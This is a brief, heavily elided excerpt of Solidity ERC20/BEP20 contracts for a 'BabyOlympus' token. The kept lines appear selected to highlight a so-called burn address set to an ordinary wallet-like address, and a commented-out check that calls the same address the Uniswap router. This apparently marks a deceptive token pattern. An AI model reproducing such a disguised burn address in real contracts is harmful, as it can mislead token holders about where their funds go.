...
contract ERC20 is Context, IERC20, Ownable {
    ...
    constructor (string memory name_, string memory symbol_) public {
        ...
        _burnaddress = 0xD04D27D1CDd70FAB46894e4c2DF15110A5EE61D1;
...
contract BabyOlympus is ERC20 {

    uint tokenTotalSupply = 1000000000000;

    constructor() public ERC20("BabyOlympus ", "BabyOlympus") {
...
contract BEP20 is Context, IERC20, Ownable {
    ...
    string private _symbol = "BabyOlympus";
    ...
    function excludeFromReward(address account) public onlyOwner() {
        // require(account != 0xD04D27D1CDd70FAB46894e4c2DF15110A5EE61D1, 'We can not exclude Uniswap router.');
